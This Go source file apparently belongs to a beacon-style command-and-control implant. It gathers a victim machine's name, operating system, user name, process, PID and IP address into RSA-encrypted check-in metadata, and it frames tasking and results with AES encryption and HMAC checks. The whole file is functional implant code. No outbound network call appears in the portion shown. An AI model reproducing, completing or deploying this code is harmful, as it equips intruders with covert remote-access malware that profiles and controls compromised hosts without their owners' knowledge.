package core

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"runtime"
	"strings"
	"time"
)

var (
	Counter  int
	MetaInfo string
	BeaconID = GetID()
)

func MetaInit() ([]byte, string) {
	Key       := RandomKey(16)
	ANSI      := IntToByte(2, 59901)
	OEM       := IntToByte(2, GetOEM())
	ID        := IntToByte(4, BeaconID)
	PID       := IntToByte(4, GetPID())
	Port      := IntToByte(2, 0)
	Flag      := IntToByte(1, GetFlag())
	OSVer     := IntToByte(2, 0)
	Build     := IntToByte(2, 0)
	PTR       := IntToByte(4, 0)
	PTR_GMH   := IntToByte(4, 0)
	PTR_GPA   := IntToByte(4, 0)
	IPAddress := IntToByte(4, GetIPAddress())

	Magic     := IntToByte(4, 48879)
	Meta      := JoinBytes(Key, ANSI, OEM, ID, PID, Port, Flag, OSVer, Build, PTR, PTR_GMH, PTR_GPA, IPAddress, []byte(fmt.Sprintf("%s (%s)\t%s\t%s", GetComputer(), strings.Title(runtime.GOOS), GetUserName(), GetProcess())))
	return RSAEncrypt(JoinBytes(Magic, IntToByte(4, len(Meta)), Meta))
}

func MakeBytes(Type int, Data []byte) {
	if Buffer.Len() > 1048576 { time.Sleep(1*time.Second) }
	WriteLock(func(){
		Counter++; Num := IntToByte(4, Counter)
		Data = JoinBytes(IntToByte(4, Type), Data)
		Data = AESEncrypt(JoinBytes(Num, IntToByte(4, len(Data)), Data))
		Buffer.Write(JoinBytes(IntToByte(4, len(Data)+16), Data, HmacHash(Data)))
	})
}

func ParseBytes(Bytes []byte) *bytes.Buffer {
	if len(Bytes) < 24 { return nil }
	Data := Bytes[:len(Bytes)-16]
	Hash := hex.EncodeToString(Bytes[len(Bytes)-16:])
	if Hash != hex.EncodeToString(HmacHash(Data)) { return nil }
	Data = AESDecrypt(Data)
	Len := ByteToInt(Data[4:8])
	return bytes.NewBuffer(Data[8:Len+8])
}